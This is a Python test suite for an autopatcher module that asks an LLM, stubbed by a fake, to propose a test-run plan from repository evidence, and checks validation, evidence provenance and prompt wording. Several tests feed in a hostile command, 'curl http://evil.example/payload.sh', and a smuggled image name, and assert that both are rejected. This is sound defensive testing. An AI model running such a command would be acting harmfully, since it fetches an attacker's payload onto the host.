"""Tests for Test Plan Discovery: the one bounded LLM call that proposes a
TestExecutionPlan from repository evidence.

A fake LLM object (duck-typed, matching LLMClient.complete's signature) is
used throughout -- no real provider call is ever made."""

from __future__ import annotations

import json
import re
from pathlib import Path
from unittest import mock

from utilities.autopatcher.test_plan_discovery import _SYSTEM_PROMPT, discover_test_plan


def _valid_response(**overrides) -> str:
    payload = {
        "setup_commands": [["python", "-m", "pip", "install", "-e", "."]],
        "test_command": ["python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml"],
        "result_strategy": "junit",
        "result_output_path": "/tmp/openant-result.xml",
        "runtime_family": "python",
        "runtime_version_hint": "3.11",
        "evidence": ["pyproject.toml"],
        "reasoning_summary": "pyproject.toml declares pytest.",
        "confidence": "high",
    }
    payload.update(overrides)
    return json.dumps(payload)


def _valid_response_missing(*missing_keys, **overrides) -> str:
    """Like _valid_response, but with the named top-level JSON key(s)
    entirely ABSENT from the payload -- distinct from setting a key to
    null/None, which keeps the key present. Used to reproduce the real
    urllib3 LLM response, which omitted "confidence" outright rather than
    supplying an explicit null for it."""
    payload = json.loads(_valid_response(**overrides))
    for key in missing_keys:
        payload.pop(key, None)
    return json.dumps(payload)


class _FakeLLM:
    def __init__(self, response):
        self.response = response
        self.calls = []

    def complete(self, system_prompt, user_message, stage="unknown"):
        self.calls.append((system_prompt, user_message, stage))
        if isinstance(self.response, Exception):
            raise self.response
        return self.response


def _repo_with_evidence(tmp_path: Path) -> Path:
    (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
    return tmp_path


def _repo_with_rich_evidence(tmp_path: Path) -> Path:
    """A repo whose evidence spans every citable category: a config
    file, a lockfile, a CI workflow, and a README testing section."""
    (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
    (tmp_path / "poetry.lock").write_text("[[package]]\n", encoding="utf-8")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("jobs:\n  test:\n    steps: [pytest]\n", encoding="utf-8")
    (tmp_path / "README.md").write_text(
        "# Demo\n\n## Testing\n\nRun `pytest`.\n", encoding="utf-8",
    )
    return tmp_path


class TestDiscoverTestPlanHappyPath:
    def test_valid_response_produces_plan(self, tmp_path):
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.test_command == ("python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml")
        assert plan.runtime_family == "python"
        assert plan.source == "llm"

    def test_exactly_one_llm_call(self, tmp_path):
        llm = _FakeLLM(_valid_response())
        discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert len(llm.calls) == 1

    def test_markdown_fences_are_stripped(self, tmp_path):
        llm = _FakeLLM("```json\n" + _valid_response() + "\n```")
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None

    def test_stage_is_recorded_for_cost_tracking(self, tmp_path):
        llm = _FakeLLM(_valid_response())
        discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert llm.calls[0][2] == "test_plan_discovery"


class TestNoEvidenceSkipsCall:
    def test_empty_repo_never_calls_llm(self, tmp_path):
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(tmp_path, llm)
        assert plan is None
        assert len(llm.calls) == 0


class TestMalformedOrUnsafeResponsesRejected:
    def test_malformed_json_returns_none(self, tmp_path):
        llm = _FakeLLM("not json at all {{{")
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_missing_required_key_returns_none(self, tmp_path):
        payload = json.loads(_valid_response())
        del payload["evidence"]
        llm = _FakeLLM(json.dumps(payload))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_invalid_result_strategy_enum_returns_none(self, tmp_path):
        llm = _FakeLLM(_valid_response(result_strategy="tap"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_unrecognized_confidence_string_normalizes_to_unknown_not_rejected(self, tmp_path):
        """confidence is advisory metadata, not execution-critical (see
        TestConfidenceMatrix below and the module docstring) -- an
        unrecognized self-report normalizes to "unknown" rather than
        discarding an otherwise valid, deterministically validated plan.
        This intentionally supersedes the old strict-reject behavior for
        this exact case."""
        llm = _FakeLLM(_valid_response(confidence="extremely-sure"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.confidence == "unknown"

    def test_low_confidence_returns_none(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence="low"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_non_dict_json_returns_none(self, tmp_path):
        llm = _FakeLLM(json.dumps(["not", "a", "dict"]))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_setup_commands_not_list_of_lists_returns_none(self, tmp_path):
        llm = _FakeLLM(_valid_response(setup_commands=["python -m pip install -e ."]))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_plan_failing_deterministic_validation_returns_none(self, tmp_path):
        """A structurally-parseable response whose CONTENT fails
        test_plan_validation.validate_plan (e.g. an unrecognized binary or
        a shell metacharacter) must still surface as None -- discovery is
        not just JSON parsing, it's validated end to end."""
        llm = _FakeLLM(_valid_response(test_command=["curl", "http://evil.example/payload.sh"]))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_runtime_family_cannot_smuggle_an_image_string(self, tmp_path):
        llm = _FakeLLM(_valid_response(runtime_family="attacker/evil:latest"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_llm_exception_returns_none(self, tmp_path):
        llm = _FakeLLM(RuntimeError("provider unavailable"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None


class TestEvidenceProvenanceEnforcement:
    """plan.evidence must be an exact subset of what was actually shown to
    the model -- never fuzzy-matched, never trusted merely because it is
    non-empty."""

    def test_all_evidence_valid_is_accepted(self, tmp_path):
        repo = _repo_with_rich_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(
            evidence=["pyproject.toml", "poetry.lock", ".github/workflows/ci.yml", "README.md"],
        ))
        plan = discover_test_plan(repo, llm)
        assert plan is not None

    def test_one_hallucinated_evidence_path_is_rejected(self, tmp_path):
        repo = _repo_with_evidence(tmp_path)  # only pyproject.toml actually exists
        llm = _FakeLLM(_valid_response(evidence=["tox.ini"]))
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_mixed_valid_and_hallucinated_evidence_is_rejected(self, tmp_path):
        repo = _repo_with_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=["pyproject.toml", "tox.ini"]))
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_ci_workflow_path_is_a_valid_citation(self, tmp_path):
        repo = _repo_with_rich_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=[".github/workflows/ci.yml"]))
        plan = discover_test_plan(repo, llm)
        assert plan is not None

    def test_lockfile_name_is_a_valid_citation(self, tmp_path):
        repo = _repo_with_rich_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=["poetry.lock"]))
        plan = discover_test_plan(repo, llm)
        assert plan is not None

    def test_readme_citation_matches_the_exact_source_filename(self, tmp_path):
        """The bundle tracks WHICH README filename was actually read
        (README.md here) -- citing that exact name is valid; citing a
        generic "README" when the real file is README.md is not (no
        fuzzy matching)."""
        repo = _repo_with_rich_evidence(tmp_path)
        llm_ok = _FakeLLM(_valid_response(evidence=["README.md"]))
        assert discover_test_plan(repo, llm_ok) is not None

        llm_bad = _FakeLLM(_valid_response(evidence=["README"]))
        assert discover_test_plan(repo, llm_bad) is None

    def test_directory_listing_entry_is_a_valid_citation(self, tmp_path):
        repo = _repo_with_evidence(tmp_path)
        (repo / "tests").mkdir()
        llm = _FakeLLM(_valid_response(evidence=["pyproject.toml", "tests/"]))
        plan = discover_test_plan(repo, llm)
        assert plan is not None

    def test_empty_evidence_list_is_rejected_by_validation(self, tmp_path):
        """Not a provenance issue per se (an empty list is trivially a
        subset of anything) -- but validate_plan's own non-empty-evidence
        rule still applies downstream."""
        repo = _repo_with_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=[]))
        plan = discover_test_plan(repo, llm)
        assert plan is None


class TestOutputFieldBounds:
    def test_overlong_reasoning_summary_is_truncated_not_rejected(self, tmp_path):
        from utilities.autopatcher.test_plan_discovery import _MAX_REASONING_SUMMARY_CHARS
        repo = _repo_with_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(reasoning_summary="x" * 5000))
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert len(plan.reasoning_summary) <= _MAX_REASONING_SUMMARY_CHARS

    def test_too_many_evidence_entries_is_rejected(self, tmp_path):
        repo = _repo_with_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=["pyproject.toml"] * 1 + [f"f{i}.txt" for i in range(30)]))
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_overlong_evidence_entry_is_rejected(self, tmp_path):
        repo = _repo_with_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=["pyproject.toml", "x" * 1000]))
        plan = discover_test_plan(repo, llm)
        assert plan is None


class TestPromptContract:
    def test_system_prompt_forbids_docker_image_proposals(self):
        assert "Never propose a Docker image" in _SYSTEM_PROMPT

    def test_system_prompt_requires_evidence_citation(self):
        assert "evidence" in _SYSTEM_PROMPT.lower()

    def test_system_prompt_forbids_chain_of_thought(self):
        assert "reasoning_summary" in _SYSTEM_PROMPT
        assert "chain of reasoning" in _SYSTEM_PROMPT or "not a chain" in _SYSTEM_PROMPT

    def test_system_prompt_distinguishes_runtime_family_from_test_tool(self):
        assert "make" in _SYSTEM_PROMPT.lower()

    def test_system_prompt_prefers_structured_output_when_safe(self):
        """The prompt must state the PREFERENCE for structured, per-test
        result output over a bare exit code -- this is the direct fix for
        the observed real-run limitation (a confident pytest repository
        that still got result_strategy="exit_code")."""
        assert "Prefer structured, per-test result output" in _SYSTEM_PROMPT
        assert "bare exit code" in _SYSTEM_PROMPT

    def test_system_prompt_requires_confidence_in_a_specific_known_runner(self):
        assert "SPECIFIC, well-known" in _SYSTEM_PROMPT
        assert "not a guess" in _SYSTEM_PROMPT

    def test_system_prompt_requires_command_to_reference_declared_path(self):
        assert "test_command's own tokens actually" in _SYSTEM_PROMPT
        assert re.search(r"will be\s+rejected", _SYSTEM_PROMPT)

    def test_system_prompt_forbids_speculative_or_third_party_flags(self):
        assert "speculative or unfamiliar runner flag" in _SYSTEM_PROMPT
        assert "third-party reporter/plugin flag" in _SYSTEM_PROMPT

    def test_system_prompt_forbids_changing_test_selection_for_structured_output(self):
        assert "any change to which tests are selected" in _SYSTEM_PROMPT

    def test_system_prompt_forbids_parallelization_retry_and_failfast_changes(self):
        assert "parallelization/xdist changes, retries, or fail-fast flags" in _SYSTEM_PROMPT

    def test_system_prompt_directs_custom_runners_to_exit_code(self):
        assert "make test" in _SYSTEM_PROMPT
        assert "./scripts/test.sh" in _SYSTEM_PROMPT

    def test_system_prompt_never_suggests_hardcoded_flag_syntax_outside_the_pytest_example(self):
        """The only concrete flag literal in the prompt is the single
        worked pytest example -- the rule itself is expressed generically
        ("that EXACT runner's own standard, built-in flag"), not as a
        hardcoded table of runner -> flag mappings. This guards against
        the prompt accidentally growing into a runner-capability database
        in a future edit."""
        assert _SYSTEM_PROMPT.count("--junitxml") <= 3


class TestSameTestSelectionInvariant:
    """Structured-output preference must never change which tests run --
    only how results are reported."""

    def test_junit_plan_selection_matches_plan_with_flag_stripped(self, tmp_path):
        base_selection = ("python", "-m", "pytest", "-k", "not slow", "test/")
        llm = _FakeLLM(_valid_response(
            test_command=list(base_selection) + ["--junitxml=/tmp/openant-result.xml"],
        ))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        selection_only = tuple(
            token for token in plan.test_command
            if plan.result_output_path not in token
        )
        assert selection_only == base_selection

    def test_exit_code_plan_selection_is_untouched(self, tmp_path):
        """An exit_code plan has no flag/path to strip -- its command IS
        the selection, unchanged."""
        base_selection = ("python", "-m", "pytest", "-k", "not slow", "test/")
        llm = _FakeLLM(_valid_response(
            test_command=list(base_selection),
            result_strategy="exit_code", result_output_path=None,
        ))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.test_command == base_selection


def _urllib3_shaped_repo(tmp_path: Path) -> Path:
    """Mirrors the actual repository-evidence shape from the real urllib3
    CVE-2023-43804 validation run that originally exposed this
    limitation: a pyproject.toml with pytest config, a noxfile.py
    invoking pytest, a dev-requirements.txt declaring pytest, and CI
    running that same invocation -- evidence that should make pytest
    identification both specific and confident."""
    (tmp_path / "pyproject.toml").write_text(
        "[tool.pytest.ini_options]\naddopts = '-ra --tb=native'\n", encoding="utf-8",
    )
    (tmp_path / "noxfile.py").write_text(
        "import nox\n\n@nox.session\ndef test(session):\n"
        "    session.run('pytest', '-v', '-ra', '--tb=native', '--strict-config', "
        "'--strict-markers', 'test/')\n",
        encoding="utf-8",
    )
    (tmp_path / "dev-requirements.txt").write_text("pytest\n", encoding="utf-8")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "test.yml").write_text(
        "jobs:\n  test:\n    steps:\n      - run: python -m pytest -v -ra --tb=native "
        "--strict-config --strict-markers test/\n",
        encoding="utf-8",
    )
    return tmp_path


class TestUrllib3ShapedRealRunRegression:
    """Modeled directly on the actual evidence bundle from the real
    urllib3 CVE-2023-43804 validation run, where Test Plan Discovery
    returned result_strategy="exit_code" despite this exact evidence
    shape clearly identifying pytest -- weakening the comparator to
    NOT_VERIFIED unnecessarily. This is a deterministic fixture (no live
    LLM call): it asserts that a plan matching the NEW preferred shape --
    junit, same test selection, only the reporting flag appended --
    validates end to end, and that the before/after commands differ by
    EXACTLY the structured-output flag."""

    _BEFORE = ("python", "-m", "pytest", "-v", "-ra", "--tb=native",
               "--strict-config", "--strict-markers", "test/")
    _AFTER = _BEFORE + ("--junitxml=/tmp/openant-result.xml",)

    def _llm(self, **overrides):
        base = dict(
            test_command=list(self._AFTER),
            result_strategy="junit",
            result_output_path="/tmp/openant-result.xml",
            evidence=["pyproject.toml", "noxfile.py", "dev-requirements.txt",
                      ".github/workflows/test.yml"],
            reasoning_summary=(
                "Repository evidence identifies pytest; JUnit XML output is "
                "enabled only to capture per-test results and does not change "
                "test selection."
            ),
        )
        base.update(overrides)
        return _FakeLLM(_valid_response(**base))

    def test_junit_plan_with_appended_flag_only_is_accepted(self, tmp_path):
        repo = _urllib3_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm())
        assert plan is not None
        assert plan.result_strategy == "junit"
        assert plan.result_output_path == "/tmp/openant-result.xml"
        assert plan.test_command == self._AFTER

    def test_appended_flag_is_the_only_difference_from_the_evidenced_invocation(self, tmp_path):
        repo = _urllib3_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm())
        assert plan is not None
        selection_only = tuple(
            token for token in plan.test_command
            if plan.result_output_path not in token
        )
        assert selection_only == self._BEFORE

    def test_reverting_to_exit_code_on_the_same_evidence_is_also_still_accepted(self, tmp_path):
        """The fix is a preference, not a mandate -- exit_code on this
        same evidence must remain a valid, accepted plan too (e.g. if the
        model is not fully confident)."""
        repo = _urllib3_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm(
            test_command=list(self._BEFORE),
            result_strategy="exit_code", result_output_path=None,
            reasoning_summary="Not fully confident in a structured-output flag; using exit_code.",
        ))
        assert plan is not None
        assert plan.result_strategy == "exit_code"


class TestCustomRunnerPrefersExitCode:
    """A bespoke command with no confidently-known structured-output flag
    must remain a valid exit_code plan -- discovery must never invent a
    result converter or wrap/replace the repository's own command."""

    def test_make_test_with_exit_code_is_accepted(self, tmp_path):
        (tmp_path / "Makefile").write_text("test:\n\tpytest\n", encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            setup_commands=[],
            test_command=["make", "test"],
            result_strategy="exit_code", result_output_path=None,
            evidence=["Makefile"],
            reasoning_summary="Makefile defines a bespoke test target; no confidently-known structured-output flag.",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.result_strategy == "exit_code"
        assert plan.result_output_path is None
        assert plan.test_command == ("make", "test")

    def test_shell_script_runner_with_exit_code_is_accepted(self, tmp_path):
        (tmp_path / "Makefile").write_text("test:\n\t./scripts/test.sh\n", encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            setup_commands=[],
            test_command=["make", "test"],
            result_strategy="exit_code", result_output_path=None,
            evidence=["Makefile"],
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.result_strategy == "exit_code"


class TestLowConfidenceNeverInventsJunit:
    def test_low_confidence_junit_claim_is_still_rejected(self, tmp_path):
        """Even if the model claims "junit" with a plausible-looking
        flag, a self-reported "low" confidence must still discard the
        whole plan -- confidence-gating happens before the plan is ever
        trusted, regardless of result_strategy."""
        llm = _FakeLLM(_valid_response(
            result_strategy="junit", result_output_path="/tmp/openant-result.xml",
            test_command=["python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml"],
            confidence="low",
        ))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_junit_claim_whose_command_never_references_the_path_is_rejected(self, tmp_path):
        """Guards against the model claiming "junit" without actually
        requesting it from the command -- validate_plan's consistency
        check must still reject this via the normal discovery path (not
        just when validate_plan is called directly)."""
        llm = _FakeLLM(_valid_response(
            result_strategy="junit", result_output_path="/tmp/openant-result.xml",
            test_command=["python", "-m", "pytest"],
        ))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None


class TestConfidenceMatrix:
    """confidence is advisory metadata, not execution-critical (see the
    module docstring's "Metadata vs. execution-critical fields" and
    "Confidence semantics"). This is the full behavior matrix: only a
    model's OWN deliberate "low" self-report still blocks discovery;
    every other case -- valid, missing, wrong-typed, or an unrecognized
    string -- must not by itself discard an otherwise valid plan."""

    def test_high_is_preserved(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence="high"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.confidence == "high"

    def test_medium_is_preserved(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence="medium"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.confidence == "medium"

    def test_low_is_the_one_case_that_still_blocks_discovery(self, tmp_path):
        """Documented, deliberate exception: a model that reports "low"
        about its OWN plan is trusted on that one point -- OpenAnt
        doesn't spend a Docker build on a plan the model has already
        said it doesn't trust. This is a cost/reliability heuristic, not
        a security boundary (deterministic validation still runs first
        for every other confidence value) -- see the module docstring."""
        llm = _FakeLLM(_valid_response(confidence="low"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_missing_confidence_does_not_discard_a_valid_plan(self, tmp_path):
        """The exact real-run bug: the LLM's response omitted
        "confidence" entirely. It must normalize to "unknown" (never
        "low", which would wrongly trigger the low-confidence policy
        rejection above) and the otherwise-valid plan must still be
        returned."""
        llm = _FakeLLM(_valid_response_missing("confidence"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.confidence == "unknown"

    def test_invalid_type_normalizes_to_unknown(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence=42))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.confidence == "unknown"

    def test_unrecognized_string_normalizes_to_unknown(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence="extremely-sure"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.confidence == "unknown"


def _urllib3_real_response_missing_confidence() -> str:
    """The EXACT shape of the real urllib3 CVE-2023-43804 Test Plan
    Discovery LLM response that triggered this fix -- a fully valid,
    execution-critical-complete plan (junit strategy, /tmp output path
    referenced by the command, valid evidence) with "confidence" omitted
    outright."""
    payload = {
        "setup_commands": [
            ["python", "-m", "pip", "install", "-r", "dev-requirements.txt"],
            ["python", "-m", "pip", "install", "."],
        ],
        "test_command": [
            "python", "-m", "pytest",
            "test/",
            "--strict-config",
            "--strict-markers",
            "--junitxml=/tmp/openant-result.xml",
        ],
        "result_strategy": "junit",
        "result_output_path": "/tmp/openant-result.xml",
        "runtime_family": "python",
        "runtime_version_hint": "3.7-3.12",
        "evidence": [
            "pyproject.toml",
            "noxfile.py",
            "dev-requirements.txt",
            ".github/workflows/ci.yml",
        ],
        "reasoning_summary": (
            "Repository evidence identifies pytest; JUnit XML is added only to "
            "capture per-test results without changing test selection."
        ),
        # "confidence" deliberately absent -- this is the real bug.
    }
    return json.dumps(payload)


def _urllib3_real_response_repo(tmp_path: Path) -> Path:
    (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
    (tmp_path / "noxfile.py").write_text(
        "import nox\n\n@nox.session\ndef test(session):\n    session.run('pytest', 'test/')\n",
        encoding="utf-8",
    )
    (tmp_path / "dev-requirements.txt").write_text("pytest\n", encoding="utf-8")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("jobs:\n  test:\n    steps:\n      - run: pytest test/\n", encoding="utf-8")
    return tmp_path


class TestUrllib3ConfidenceOmittedRealRunRegression:
    """Reproduces the exact real-run failure: a strong, fully
    execution-critical-valid plan was discarded solely because the
    response omitted "confidence". No live LLM call -- a deterministic
    fixture built from the exact JSON shape observed in the real run.

    Expected result after the fix: the plan parses successfully, passes
    deterministic validation, and discover_test_plan returns a usable
    TestExecutionPlan."""

    def test_plan_is_discovered_despite_missing_confidence(self, tmp_path):
        repo = _urllib3_real_response_repo(tmp_path)
        llm = _FakeLLM(_urllib3_real_response_missing_confidence())
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert plan.result_strategy == "junit"
        assert plan.result_output_path == "/tmp/openant-result.xml"
        assert plan.confidence == "unknown"
        assert plan.test_command == (
            "python", "-m", "pytest", "test/", "--strict-config",
            "--strict-markers", "--junitxml=/tmp/openant-result.xml",
        )

    def test_plan_passes_deterministic_validation(self, tmp_path):
        from utilities.autopatcher.test_plan_validation import validate_plan
        repo = _urllib3_real_response_repo(tmp_path)
        llm = _FakeLLM(_urllib3_real_response_missing_confidence())
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        result = validate_plan(plan)
        assert result.valid is True
        assert result.reason is None

    def test_execution_critical_fields_are_all_still_enforced_on_this_exact_shape(self, tmp_path):
        """Sanity check that this fixture isn't accidentally exercising a
        weakened path -- breaking any EXECUTION-CRITICAL field on this
        exact real shape must still reject, confidence fix notwithstanding."""
        repo = _urllib3_real_response_repo(tmp_path)
        broken = json.loads(_urllib3_real_response_missing_confidence())
        broken["test_command"] = ["curl", "http://evil.example/payload.sh"]
        llm = _FakeLLM(json.dumps(broken))
        plan = discover_test_plan(repo, llm)
        assert plan is None


class TestMetadataFieldsToleratedWhenMissingNotWhenMalformed:
    """reasoning_summary and runtime_version_hint suffered the exact same
    _REQUIRED_KEYS bug as confidence (see module docstring) -- fixed the
    same way, but WITHOUT loosening the existing malformed-VALUE
    rejection for either (only their outright absence is now tolerated;
    scope deliberately not broadened beyond that)."""

    def test_missing_runtime_version_hint_defaults_to_none(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("runtime_version_hint"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.runtime_version_hint is None

    def test_missing_reasoning_summary_defaults_to_empty_string(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("reasoning_summary"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.reasoning_summary == ""

    def test_malformed_runtime_version_hint_type_still_rejects_whole_plan(self, tmp_path):
        """Unchanged from before this fix: a WRONG-TYPE value (not
        merely absent) is still a hard rejection, not a silent drop."""
        llm = _FakeLLM(_valid_response(runtime_version_hint=["3.11"]))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_malformed_reasoning_summary_type_still_rejects_whole_plan(self, tmp_path):
        llm = _FakeLLM(_valid_response(reasoning_summary=12345))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_missing_confidence_and_missing_runtime_version_hint_together_still_succeed(self, tmp_path):
        """Multiple simultaneously-omitted metadata fields compose --
        this isn't a special case wired only for "confidence alone"."""
        llm = _FakeLLM(_valid_response_missing("confidence", "runtime_version_hint"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.confidence == "unknown"
        assert plan.runtime_version_hint is None


class TestExecutionCriticalFieldsStillStrictlyRequired:
    """Explicit regression guard: the metadata tolerance added by this
    fix must NOT have loosened any execution-critical field. Each of
    these must still reject when its key is missing entirely."""

    def test_missing_setup_commands_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("setup_commands"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None

    def test_missing_test_command_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("test_command"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None

    def test_missing_result_strategy_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("result_strategy"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None

    def test_missing_result_output_path_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("result_output_path"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None

    def test_missing_runtime_family_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("runtime_family"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None

    def test_missing_evidence_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("evidence"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None


class TestRejectionReasonDiagnostics:
    """Optional, opt-in, additive-only: passing a rejection_reason list
    lets traced/debug tooling distinguish WHY discovery returned None,
    without changing discover_test_plan's return value or affecting any
    caller that doesn't pass it (see existing_test_regression.py's
    unchanged call site)."""

    def test_default_call_with_no_reason_param_is_unaffected(self, tmp_path):
        """Zero-behavior-change guarantee: omitting the parameter
        entirely behaves exactly as before."""
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None

    def test_successful_discovery_appends_nothing(self, tmp_path):
        reasons = []
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is not None
        assert reasons == []

    def test_no_evidence_reason_is_distinguishable(self, tmp_path):
        reasons = []
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(tmp_path, llm, rejection_reason=reasons)  # no evidence written
        assert plan is None
        assert len(reasons) == 1
        assert "evidence" in reasons[0]

    def test_malformed_json_reason_is_distinguishable(self, tmp_path):
        reasons = []
        llm = _FakeLLM("not json at all {{{")
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert "not valid JSON" in reasons[0]

    def test_missing_execution_critical_field_reason_names_the_field(self, tmp_path):
        reasons = []
        llm = _FakeLLM(_valid_response_missing("test_command"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert "test_command" in reasons[0]

    def test_deterministic_validation_failure_reason_is_distinguishable(self, tmp_path):
        reasons = []
        llm = _FakeLLM(_valid_response(test_command=["curl", "http://evil.example/payload.sh"]))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert "deterministic plan validation failed" in reasons[0]

    def test_low_confidence_policy_rejection_reason_is_distinguishable(self, tmp_path):
        reasons = []
        llm = _FakeLLM(_valid_response(confidence="low"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert "low confidence" in reasons[0]

    def test_llm_exception_reason_is_distinguishable(self, tmp_path):
        reasons = []
        llm = _FakeLLM(RuntimeError("provider unavailable"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert "LLM call failed" in reasons[0]

    def test_hallucinated_evidence_reason_is_distinguishable(self, tmp_path):
        reasons = []
        repo = _repo_with_evidence(tmp_path)  # only pyproject.toml actually exists
        llm = _FakeLLM(_valid_response(evidence=["tox.ini"]))
        plan = discover_test_plan(repo, llm, rejection_reason=reasons)
        assert plan is None
        assert "evidence citation" in reasons[0]

    def test_reason_string_is_bounded(self, tmp_path):
        from utilities.autopatcher.test_plan_discovery import _MAX_REJECTION_REASON_CHARS
        reasons = []
        # An overlong, malformed response -- the reason itself must stay
        # bounded even if the underlying failure text could be long.
        llm = _FakeLLM(_valid_response(test_command=["curl"] + ["x" * 50] * 20))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert len(reasons[0]) <= _MAX_REJECTION_REASON_CHARS


class TestPromptRequiresRepositoryGrounding:
    """Prompt-content contract for the repository-grounding fix (see the
    module docstring's real minimist failure example). These assert on
    the SYSTEM PROMPT's instructions, not on model behavior -- there is
    no live LLM call anywhere in this test suite."""

    def test_prompt_states_discovery_not_invention(self):
        assert "YOUR JOB IS DISCOVERY, NOT INVENTION" in _SYSTEM_PROMPT
        assert "NO PLAN IS BETTER THAN A GUESSED PLAN" in _SYSTEM_PROMPT

